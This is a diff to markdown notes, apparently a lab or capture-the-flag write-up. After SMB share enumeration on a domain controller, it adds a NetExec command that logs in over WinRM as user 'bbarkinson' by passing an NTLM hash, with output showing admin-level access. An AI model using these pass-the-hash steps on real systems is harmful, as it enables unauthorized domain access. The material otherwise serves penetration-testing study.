@@ -596,3 +596,16 @@ SMB         10.0.22.198     445    DC01             IPC$            READ        
 SMB         10.0.22.198     445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.0.22.198     445    DC01             SYSVOL          READ            Logon server share
 ```
+
+## Access on WINRM as `bbarkinson`
+```python
+nxc winrm DC01.hsm.local -u bbarkinson -H '53c3709ae3d9f4428a230db81361ffbc'                             
+WINRM       10.0.22.198     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hsm.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.0.22.198     5985   DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc (Pwn3d!)
+```
+I can get a session over winrm as this user
+
+```
+```
